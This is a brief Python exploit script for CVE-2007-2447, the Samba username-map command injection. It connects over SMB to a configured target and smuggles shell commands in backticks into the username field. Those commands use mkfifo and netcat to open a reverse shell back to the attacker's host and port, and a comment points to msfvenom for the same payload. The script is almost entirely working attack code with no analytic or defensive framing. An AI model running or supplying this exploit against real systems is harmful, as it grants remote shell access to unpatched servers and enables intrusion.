from smb.SMBConnection import SMBConnection

#CVE ID#:     CVE-2007-2447

#config
LHOST = "192.168.1.3"
LPORT = "1337"
RHOST = "192.168.1.13"
#config end

#also msfvenom can be used to get something like below in hex
#msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.15 LPORT=1337 -f python
userID = "username `nohup mkfifo /tmp/cbraw; nc "+LHOST+" "+LPORT+" 0</tmp/cbraw | /bin/sh >/tmp/cbraw 2>&1; rm /tmp/cbraw`"
password = "password"


print userID

conn = SMBConnection(userID,password,"","",use_ntlm_v2 = False)

conn.connect(RHOST,445)
